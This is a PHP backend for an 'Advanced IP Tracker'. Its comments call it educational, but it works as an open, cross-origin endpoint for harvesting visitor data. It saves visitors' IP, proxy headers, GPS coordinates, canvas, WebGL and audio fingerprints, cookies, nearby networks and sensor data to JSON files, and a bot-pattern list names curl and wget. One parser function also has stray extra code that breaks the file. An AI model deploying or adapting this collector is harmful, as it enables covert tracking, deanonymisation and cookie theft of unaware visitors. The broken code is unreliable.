<?php
/**
 * Advanced IP Tracker - Data Collection Backend
 * Herramienta educativa para demostrar riesgos de seguridad
 * 
 * ADVERTENCIA: Esta herramienta es solo para fines educativos
 * No debe usarse para actividades maliciosas
 */

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Manejar preflight requests
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Incluir el procesador avanzado de datos
require_once 'advanced-data-processor.php';

// Configuración
define('DATA_DIR', '../data/');
define('LOGS_DIR', '../logs/');
define('MAX_LOG_SIZE', 10 * 1024 * 1024); // 10MB

// Crear directorios si no existen
if (!file_exists(DATA_DIR)) {
    mkdir(DATA_DIR, 0755, true);
}
if (!file_exists(LOGS_DIR)) {
    mkdir(LOGS_DIR, 0755, true);
}

/**
 * Obtener información detallada de la IP
 */
function getDetailedIPInfo($ip) {
    $ipInfo = [
        'ip' => $ip,
        'timestamp' => date('Y-m-d H:i:s'),
        'is_private' => filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false,
        'is_ipv6' => filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6) !== false,
        'reverse_dns' => gethostbyaddr($ip),
        'headers' => []
    ];
    
    // Recopilar headers relevantes
    $relevantHeaders = [
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_REAL_IP',
        'HTTP_X_FORWARDED_PROTO',
        'HTTP_CF_CONNECTING_IP',
        'HTTP_CLIENT_IP',
        'HTTP_X_CLUSTER_CLIENT_IP',
        'HTTP_FORWARDED_FOR',
        'HTTP_FORWARDED',
        'HTTP_VIA',
        'HTTP_X_FORWARDED_HOST',
        'HTTP_X_FORWARDED_SERVER'
    ];
    
    foreach ($relevantHeaders as $header) {
        if (isset($_SERVER[$header])) {
            $ipInfo['headers'][$header] = $_SERVER[$header];
        }
    }
    
    // Intentar obtener geolocalización de la IP (usando servicio gratuito)
    if (!$ipInfo['is_private']) {
        $geoData = getGeoLocation($ip);
        if ($geoData) {
            $ipInfo['geolocation'] = $geoData;
        }
    }
    
    return $ipInfo;
}

/**
 * Obtener geolocalización de la IP usando múltiples servicios
 */
function getGeoLocation($ip) {
    $services = [
        [
            'name' => 'ip-api',
            'url' => "http://ip-api.com/json/{$ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query",
            'parser' => 'parseIpApi'
        ],
        [
            'name' => 'ipinfo',
            'url' => "https://ipinfo.io/{$ip}/json",
            'parser' => 'parseIpInfo'
        ],
        [
            'name' => 'ipapi',
            'url' => "https://ipapi.co/{$ip}/json/",
            'parser' => 'parseIpApiCo'
        ]
    ];
    
    $results = [];
    
    foreach ($services as $service) {
        try {
            $context = stream_context_create([
                'http' => [
                    'timeout' => 8,
                    'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'header' => "Accept: application/json\r\n"
                ]
            ]);
            
            $response = file_get_contents($service['url'], false, $context);
            if ($response !== false) {
                $data = json_decode($response, true);
                if ($data) {
                    $parsed = call_user_func($service['parser'], $data);
                    if ($parsed) {
                        $results[$service['name']] = $parsed;
                    }
                }
            }
        } catch (Exception $e) {
            error_log("Error con servicio {$service['name']}: " . $e->getMessage());
        }
    }
    
    // Retornar el mejor resultado disponible o combinar datos
    if (!empty($results)) {
        return [
            'services_used' => array_keys($results),
            'data' => $results,
            'primary' => reset($results), // Primer resultado exitoso
            'timestamp' => date('Y-m-d H:i:s')
        ];
    }
    
    return null;
}

/**
 * Parser para ip-api.com
 */
function parseIpApi($data) {
    if (!isset($data['status']) || $data['status'] !== 'success') {
        return null;
    }
    
    return [
        'country' => $data['country'] ?? 'Unknown',
        'country_code' => $data['countryCode'] ?? 'XX',
        'continent' => $data['continent'] ?? 'Unknown',
        'continent_code' => $data['continentCode'] ?? 'XX',
        'region' => $data['regionName'] ?? 'Unknown',
        'region_code' => $data['region'] ?? 'XX',
        'city' => $data['city'] ?? 'Unknown',
        'district' => $data['district'] ?? null,
        'zip' => $data['zip'] ?? null,
        'latitude' => $data['lat'] ?? null,
        'longitude' => $data['lon'] ?? null,
        'timezone' => $data['timezone'] ?? null,
        'offset' => $data['offset'] ?? null,
        'currency' => $data['currency'] ?? null,
        'isp' => $data['isp'] ?? 'Unknown',
        'org' => $data['org'] ?? 'Unknown',
        'as' => $data['as'] ?? null,
        'as_name' => $data['asname'] ?? null,
        'reverse_dns' => $data['reverse'] ?? null,
        'mobile' => $data['mobile'] ?? false,
        'proxy' => $data['proxy'] ?? false,
        'hosting' => $data['hosting'] ?? false,
        'service' => 'ip-api.com'
    ];
}

/**
 * Parser para ipinfo.io
 */
function parseIpInfo($data) {
    if (isset($data['error'])) {
        return null;
    }
    
    $loc = isset($data['loc']) ? explode(',', $data['loc']) : [null, null];
    
    return [
        'country' => $data['country'] ?? 'Unknown',
        'country_code' => $data['country'] ?? 'XX',
        'region' => $data['region'] ?? 'Unknown',
        'city' => $data['city'] ?? 'Unknown',
        'latitude' => $loc[0] ?? null,
        'longitude' => $loc[1] ?? null,
        'timezone' => $data['timezone'] ?? null,
        'isp' => $data['org'] ?? 'Unknown',
        'postal' => $data['postal'] ?? null,
        'hostname' => $data['hostname'] ?? null,
        'service' => 'ipinfo.io'
    ];
}

/**
 * Parser para ipapi.co
 */
function parseIpApiCo($data) {
    if (isset($data['error'])) {
        return null;
    }
    
    return [
        'country' => $data['country_name'] ?? 'Unknown',
        'country_code' => $data['country_code'] ?? 'XX',
        'continent' => $data['continent_code'] ?? 'Unknown',
        'region' => $data['region'] ?? 'Unknown',
        'city' => $data['city'] ?? 'Unknown',
        'latitude' => $data['latitude'] ?? null,
        'longitude' => $data['longitude'] ?? null,
        'timezone' => $data['timezone'] ?? null,
        'isp' => $data['org'] ?? 'Unknown',
        'postal' => $data['postal'] ?? null,
        'calling_code' => $data['country_calling_code'] ?? null,
        'currency' => $data['currency'] ?? null,
        'languages' => $data['languages'] ?? null,
        'service' => 'ipapi.co'
    ];
    }
    
    return null;
}

/**
 * Determinar el nivel de precisión estimado basado en los datos disponibles
 */
function determinePrecisionLevel($processedData) {
    // Si tenemos GPS válido, usar su precisión
    if (isset($processedData['coordinates']['gps']) && $processedData['validation']['gps'] === 'valid') {
        $accuracy = $processedData['coordinates']['gps']['accuracy'];
        if ($accuracy <= 10) return 'very_high';
        if ($accuracy <= 50) return 'high';
        if ($accuracy <= 200) return 'medium';
        return 'low';
    }
    
    // Si solo tenemos IP, es precisión baja
    if (isset($processedData['coordinates']['ip_services']) && !empty($processedData['coordinates']['ip_services'])) {
        return 'ip_only';
    }
    
    return 'unknown';
}

/**
 * Procesar datos de geolocalización avanzada con validación mejorada
 */
function processAdvancedGeolocation($geoData, $allData = null) {
    // Verificar si hay datos GPS en additional_data
    $gpsData = null;
    if ($allData && isset($allData['locationData'])) {
        $gpsData = $allData['locationData'];
    }
    
    // Si no hay datos GPS válidos, retornar unavailable
    if (!$gpsData && (!is_array($geoData) || empty($geoData))) {
        return ['status' => 'unavailable', 'reason' => 'no_data'];
    }
    
    $processed = [
        'timestamp' => date('Y-m-d H:i:s'),
        'methods_used' => [],
        'accuracy_level' => $gpsData['accuracy'] ?? $geoData['accuracy'] ?? 'unknown',
        'coordinates' => [],
        'validation' => [],
        'attempts' => $geoData['attempts'] ?? [],
        'estimated_precision' => 'unknown'
    ];
    
    // Procesar datos GPS del navegador (desde locationData o geoData)
    $gpsSource = $gpsData ?? ($geoData['gps'] ?? null);
    if ($gpsSource && is_array($gpsSource) && !isset($gpsSource['error'])) {
        $processed['methods_used'][] = 'gps';
        $processed['coordinates']['gps'] = [
            'latitude' => $gpsSource['latitude'],
            'longitude' => $gpsSource['longitude'],
            'accuracy' => $gpsSource['accuracy'],
            'altitude' => $gpsSource['altitude'] ?? null,
            'heading' => $gpsSource['heading'] ?? null,
            'speed' => $gpsSource['speed'] ?? null,
            'timestamp' => $gpsSource['timestamp']
        ];
        
        // Validar coordenadas GPS con más detalle
        $lat = $gpsSource['latitude'];
        $lon = $gpsSource['longitude'];
        $accuracy = $gpsSource['accuracy'];
        
        if ($lat >= -90 && $lat <= 90 && $lon >= -180 && $lon <= 180) {
            $processed['validation']['gps'] = 'valid';
            $processed['validation']['gps_accuracy_meters'] = $accuracy;
            
            // Clasificar precisión GPS
            if ($accuracy <= 10) {
                $processed['validation']['gps_precision'] = 'very_high';
            } elseif ($accuracy <= 50) {
                $processed['validation']['gps_precision'] = 'high';
            } elseif ($accuracy <= 200) {
                $processed['validation']['gps_precision'] = 'medium';
            } else {
                $processed['validation']['gps_precision'] = 'low';
            }
        } else {
            $processed['validation']['gps'] = 'invalid_coordinates';
        }
    } else {
        $processed['validation']['gps'] = 'unavailable';
        if (isset($gpsSource['error'])) {
            $processed['validation']['gps_error'] = $gpsSource['error'];
        } elseif (isset($geoData['gps']['error'])) {
            $processed['validation']['gps_error'] = $geoData['gps']['error'];
        }
    }
    
    // Procesar validación cruzada si está disponible
    if (isset($geoData['validation']) && is_array($geoData['validation'])) {
        $processed['validation'] = array_merge($processed['validation'], $geoData['validation']);
    }
    
    // Procesar datos de geolocalización por IP
    if (isset($geoData['ip']) && is_array($geoData['ip'])) {
        $processed['methods_used'][] = 'ip_services';
        $processed['coordinates']['ip_services'] = [];
        
        foreach ($geoData['ip'] as $service) {
            if (isset($service['data']) && is_array($service['data'])) {
                $serviceData = $service['data'];
                $processed['coordinates']['ip_services'][] = [
                    'service' => $service['service'],
                    'country' => $serviceData['country'] ?? $serviceData['country_name'] ?? 'unknown',
                    'region' => $serviceData['region'] ?? $serviceData['region_name'] ?? 'unknown',
                    'city' => $serviceData['city'] ?? 'unknown',
                    'latitude' => $serviceData['lat'] ?? $serviceData['latitude'] ?? null,
                    'longitude' => $serviceData['lon'] ?? $serviceData['longitude'] ?? null,
                    'isp' => $serviceData['isp'] ?? $serviceData['org'] ?? 'unknown',
                    'timezone' => $serviceData['timezone'] ?? 'unknown'
                ];
            }
        }
    }
    
    // Procesar información de zona horaria
    if (isset($geoData['timezone'])) {
        $processed['methods_used'][] = 'timezone';
        $processed['timezone_info'] = $geoData['timezone'];
        
        // Validar consistencia de zona horaria
        if (isset($processed['coordinates']['ip_services'])) {
            foreach ($processed['coordinates']['ip_services'] as $service) {
                if (isset($service['timezone']) && $service['timezone'] === $geoData['timezone']['name']) {
                    $processed['validation']['timezone_consistency'] = 'consistent';
                    break;
                } else {
                    $processed['validation']['timezone_consistency'] = 'inconsistent';
                }
            }
        }
    }
    
    // Calcular precisión estimada
    if (isset($processed['coordinates']['gps'])) {
        $accuracy = $processed['coordinates']['gps']['accuracy'];
        if ($accuracy < 10) {
            $processed['estimated_precision'] = 'very_high';
        } elseif ($accuracy < 100) {
            $processed['estimated_precision'] = 'high';
        } elseif ($accuracy < 1000) {
            $processed['estimated_precision'] = 'medium';
        } else {
            $processed['estimated_precision'] = 'low';
        }
    } else {
        $processed['estimated_precision'] = 'ip_only';
    }
    
    // Comparar coordenadas GPS vs IP si ambas están disponibles
    if (isset($processed['coordinates']['gps']) && isset($processed['coordinates']['ip_services'])) {
        $gpsLat = $processed['coordinates']['gps']['latitude'];
        $gpsLon = $processed['coordinates']['gps']['longitude'];
        
        foreach ($processed['coordinates']['ip_services'] as $service) {
            if ($service['latitude'] && $service['longitude']) {
                $distance = calculateDistance($gpsLat, $gpsLon, $service['latitude'], $service['longitude']);
                $processed['validation']['gps_vs_ip_distance_km'] = round($distance, 2);
                break;
            }
        }
    }
    
    // Determinar precisión final basada en los datos procesados
    $processed['estimated_precision'] = determinePrecisionLevel($processed);
    
    return $processed;
}

/**
 * Calcular distancia entre dos puntos geográficos (fórmula de Haversine)
 */
function calculateDistance($lat1, $lon1, $lat2, $lon2) {
    $earthRadius = 6371; // Radio de la Tierra en kilómetros
    
    $dLat = deg2rad($lat2 - $lat1);
    $dLon = deg2rad($lon2 - $lon1);
    
    $a = sin($dLat/2) * sin($dLat/2) + cos(deg2rad($lat1)) * cos(deg2rad($lat2)) * sin($dLon/2) * sin($dLon/2);
    $c = 2 * atan2(sqrt($a), sqrt(1-$a));
    
    return $earthRadius * $c;
}

/**
 * Obtener información del User Agent
 */
function parseUserAgent($userAgent) {
    $info = [
        'raw' => $userAgent,
        'browser' => 'Unknown',
        'version' => 'Unknown',
        'os' => 'Unknown',
        'device' => 'Unknown',
        'is_mobile' => false,
        'is_tablet' => false,
        'is_desktop' => false,
        'is_bot' => false
    ];
    
    // Detectar bots
    $botPatterns = [
        'bot', 'crawler', 'spider', 'scraper', 'curl', 'wget', 'python', 'java',
        'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 'yandexbot'
    ];
    
    foreach ($botPatterns as $pattern) {
        if (stripos($userAgent, $pattern) !== false) {
            $info['is_bot'] = true;
            break;
        }
    }
    
    // Detectar navegador
    if (preg_match('/Chrome\/([0-9.]+)/', $userAgent, $matches)) {
        $info['browser'] = 'Chrome';
        $info['version'] = $matches[1];
    } elseif (preg_match('/Firefox\/([0-9.]+)/', $userAgent, $matches)) {
        $info['browser'] = 'Firefox';
        $info['version'] = $matches[1];
    } elseif (preg_match('/Safari\/([0-9.]+)/', $userAgent, $matches)) {
        $info['browser'] = 'Safari';
        $info['version'] = $matches[1];
    } elseif (preg_match('/Edge\/([0-9.]+)/', $userAgent, $matches)) {
        $info['browser'] = 'Edge';
        $info['version'] = $matches[1];
    }
    
    // Detectar sistema operativo
    if (stripos($userAgent, 'Windows NT 10.0') !== false) {
        $info['os'] = 'Windows 10/11';
    } elseif (stripos($userAgent, 'Windows NT 6.3') !== false) {
        $info['os'] = 'Windows 8.1';
    } elseif (stripos($userAgent, 'Windows NT 6.1') !== false) {
        $info['os'] = 'Windows 7';
    } elseif (stripos($userAgent, 'Mac OS X') !== false) {
        $info['os'] = 'macOS';
    } elseif (stripos($userAgent, 'Linux') !== false) {
        $info['os'] = 'Linux';
    } elseif (stripos($userAgent, 'Android') !== false) {
        $info['os'] = 'Android';
    } elseif (stripos($userAgent, 'iOS') !== false) {
        $info['os'] = 'iOS';
    }
    
    // Detectar tipo de dispositivo
    if (stripos($userAgent, 'Mobile') !== false || stripos($userAgent, 'Android') !== false) {
        $info['is_mobile'] = true;
        $info['device'] = 'Mobile';
    } elseif (stripos($userAgent, 'Tablet') !== false || stripos($userAgent, 'iPad') !== false) {
        $info['is_tablet'] = true;
        $info['device'] = 'Tablet';
    } else {
        $info['is_desktop'] = true;
        $info['device'] = 'Desktop';
    }
    
    return $info;
}

/**
 * Obtener información de red adicional
 */
function getNetworkInfo() {
    $networkInfo = [
        'server_name' => $_SERVER['SERVER_NAME'] ?? 'unknown',
        'server_port' => $_SERVER['SERVER_PORT'] ?? 'unknown',
        'request_method' => $_SERVER['REQUEST_METHOD'] ?? 'unknown',
        'request_uri' => $_SERVER['REQUEST_URI'] ?? 'unknown',
        'query_string' => $_SERVER['QUERY_STRING'] ?? '',
        'request_time' => $_SERVER['REQUEST_TIME'] ?? time(),
        'request_time_float' => $_SERVER['REQUEST_TIME_FLOAT'] ?? microtime(true),
        'https' => isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off',
        'connection_type' => $_SERVER['HTTP_CONNECTION'] ?? 'unknown',
        'accept_language' => $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'unknown',
        'accept_encoding' => $_SERVER['HTTP_ACCEPT_ENCODING'] ?? 'unknown',
        'accept' => $_SERVER['HTTP_ACCEPT'] ?? 'unknown'
    ];
    
    return $networkInfo;
}

/**
 * Guardar datos en archivo JSON
 */
function saveData($data, $filename) {
    $filepath = DATA_DIR . $filename;
    $jsonData = json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    
    if (file_put_contents($filepath, $jsonData) !== false) {
        return true;
    }
    
    return false;
}

/**
 * Registrar evento en log
 */
function logEvent($event, $data = []) {
    $logFile = LOGS_DIR . 'tracker_' . date('Y-m-d') . '.log';
    
    // Rotar log si es muy grande
    if (file_exists($logFile) && filesize($logFile) > MAX_LOG_SIZE) {
        rename($logFile, $logFile . '.' . time() . '.old');
    }
    
    $logEntry = [
        'timestamp' => date('Y-m-d H:i:s'),
        'event' => $event,
        'ip' => getRealIP(),
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
        'data' => $data
    ];
    
    $logLine = json_encode($logEntry, JSON_UNESCAPED_UNICODE) . "\n";
    file_put_contents($logFile, $logLine, FILE_APPEND | LOCK_EX);
}

/**
 * Obtener la IP real del cliente
 */
function getRealIP() {
    $ipKeys = [
        'HTTP_CF_CONNECTING_IP',
        'HTTP_CLIENT_IP',
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_FORWARDED',
        'HTTP_X_CLUSTER_CLIENT_IP',
        'HTTP_FORWARDED_FOR',
        'HTTP_FORWARDED',
        'HTTP_X_REAL_IP',
        'REMOTE_ADDR'
    ];
    
    foreach ($ipKeys as $key) {
        if (array_key_exists($key, $_SERVER) === true) {
            $ips = explode(',', $_SERVER[$key]);
            $ip = trim($ips[0]);
            
            if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                return $ip;
            }
        }
    }
    
    return $_SERVER['REMOTE_ADDR'] ?? 'unknown';
}

/**
 * Procesar datos recibidos
 */
function processData() {
    try {
        // Obtener datos del POST
        $input = file_get_contents('php://input');
        $receivedData = json_decode($input, true);
        
        if (!$receivedData) {
            throw new Exception('Datos inválidos recibidos');
        }
        
        // Inicializar procesador avanzado
        $advancedProcessor = new AdvancedDataProcessor();
        
        // Obtener IP real
        $clientIP = getRealIP();
        
        // Procesar datos avanzados si están presentes
        $processedAdvancedData = [];
        
        if (isset($receivedData['behaviorData'])) {
            $processedAdvancedData['behavior'] = $advancedProcessor->processBehaviorData($receivedData['behaviorData']);
        }
        
        if (isset($receivedData['networkData'])) {
            $processedAdvancedData['network_analysis'] = $advancedProcessor->processNetworkData($receivedData['networkData']);
        }
        
        if (isset($receivedData['deviceData'])) {
            $processedAdvancedData['device_analysis'] = $advancedProcessor->processDeviceData($receivedData['deviceData']);
        }
        
        if (isset($receivedData['locationData'])) {
            $processedAdvancedData['location_analysis'] = $advancedProcessor->processLocationData($receivedData['locationData']);
        }
        
        // Crear estructura de datos completa
        $completeData = [
            'session_id' => $receivedData['trackingId'] ?? uniqid('session_', true),
            'timestamp' => date('Y-m-d H:i:s'),
            'event_type' => $receivedData['event'] ?? 'data_collection',
            
            // Información de IP y red
            'network' => [
                'client_ip' => $clientIP,
                'ip_details' => getDetailedIPInfo($clientIP),
                'network_info' => getNetworkInfo()
            ],
            
            // Información del navegador
            'browser' => [
                'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
                'parsed_ua' => parseUserAgent($_SERVER['HTTP_USER_AGENT'] ?? ''),
                'language' => $receivedData['language'] ?? 'unknown',
                'languages' => $receivedData['languages'] ?? [],
                'platform' => $receivedData['platform'] ?? 'unknown',
                'cookie_enabled' => $receivedData['cookieEnabled'] ?? false,
                'do_not_track' => $receivedData['doNotTrack'] ?? 'unknown',
                'online' => $receivedData['onLine'] ?? true
            ],
            
            // Información de pantalla y dispositivo
            'device' => [
                'screen_width' => $receivedData['screenWidth'] ?? 0,
                'screen_height' => $receivedData['screenHeight'] ?? 0,
                'screen_color_depth' => $receivedData['screenColorDepth'] ?? 0,
                'screen_pixel_depth' => $receivedData['screenPixelDepth'] ?? 0,
                'screen_avail_width' => $receivedData['screenAvailWidth'] ?? 0,
                'screen_avail_height' => $receivedData['screenAvailHeight'] ?? 0,
                'window_width' => $receivedData['windowWidth'] ?? 0,
                'window_height' => $receivedData['windowHeight'] ?? 0,
                'window_outer_width' => $receivedData['windowOuterWidth'] ?? 0,
                'window_outer_height' => $receivedData['windowOuterHeight'] ?? 0,
                'hardware_concurrency' => $receivedData['hardwareConcurrency'] ?? 0,
                'device_memory' => $receivedData['deviceMemory'] ?? 'unknown'
            ],
            
            // Información de zona horaria
            'timezone' => [
                'timezone' => $receivedData['timezone'] ?? 'unknown',
                'timezone_offset' => $receivedData['timezoneOffset'] ?? 0,
                'timezone_advanced' => $receivedData['timezoneAdvanced'] ?? null
            ],
            
            // Información de conexión
            'connection' => [
                'type' => $receivedData['connectionType'] ?? 'unknown',
                'downlink' => $receivedData['connectionDownlink'] ?? 'unknown',
                'rtt' => $receivedData['connectionRtt'] ?? 'unknown'
            ],
            
            // Plugins instalados
            'plugins' => $receivedData['plugins'] ?? [],
            
            // Fingerprinting
            'fingerprinting' => [
                'canvas' => $receivedData['canvasFingerprint'] ?? 'unavailable',
                'webgl' => $receivedData['webglFingerprint'] ?? 'unavailable',
                'audio' => $receivedData['audioFingerprint'] ?? 'unavailable',
                'fonts' => $receivedData['fonts'] ?? []
            ],
            
            // Información de batería
            'battery' => $receivedData['battery'] ?? 'unavailable',
            
            // Geolocalización avanzada
            'geolocation' => processAdvancedGeolocation($receivedData['geolocation'] ?? [], $receivedData),
            
            // Redes cercanas para triangulación
            'nearby_networks' => $receivedData['nearbyNetworks'] ?? 'unavailable',
            
            // Sensores del dispositivo
            'device_sensors' => $receivedData['deviceSensors'] ?? 'unavailable',
            
            // Información de almacenamiento
            'storage' => [
                'local_storage' => $receivedData['localStorage'] ?? false,
                'session_storage' => $receivedData['sessionStorage'] ?? false,
                'cookies' => $receivedData['cookies'] ?? ''
            ],
            
            // Información de navegación
            'navigation' => [
                'referrer' => $receivedData['referrer'] ?? $_SERVER['HTTP_REFERER'] ?? 'direct',
                'current_url' => $receivedData['currentUrl'] ?? 'unknown',
                'document_title' => $receivedData['documentTitle'] ?? 'unknown',
                'document_charset' => $receivedData['documentCharset'] ?? 'unknown'
            ],
            
            // Datos adicionales recibidos
            'additional_data' => $receivedData,
            
            // Análisis avanzado procesado
            'advanced_analysis' => $processedAdvancedData
        ];
        
        // Generar nombre de archivo único
        $filename = 'capture_' . date('Y-m-d_H-i-s') . '_' . substr(md5($clientIP . time()), 0, 8) . '.json';
        
        // Guardar datos
        if (saveData($completeData, $filename)) {
            logEvent('data_saved', ['filename' => $filename, 'ip' => $clientIP]);
            
            return [
                'success' => true,
                'message' => 'Datos recolectados exitosamente',
                'session_id' => $completeData['session_id'],
                'filename' => $filename,
                'timestamp' => $completeData['timestamp']
            ];
        } else {
            throw new Exception('Error guardando datos');
        }
        
    } catch (Exception $e) {
        logEvent('error', ['message' => $e->getMessage()]);
        
        return [
            'success' => false,
            'message' => 'Error procesando datos: ' . $e->getMessage()
        ];
    }
}

// Procesar solicitud
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $result = processData();
    echo json_encode($result, JSON_UNESCAPED_UNICODE);
} else {
    // Información básica para GET requests
    $basicInfo = [
        'service' => 'Advanced IP Tracker - Data Collection API',
        'version' => '1.0',
        'status' => 'active',
        'timestamp' => date('Y-m-d H:i:s'),
        'client_ip' => getRealIP(),
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown'
    ];
    
    logEvent('api_access', $basicInfo);
    echo json_encode($basicInfo, JSON_UNESCAPED_UNICODE);
}
?>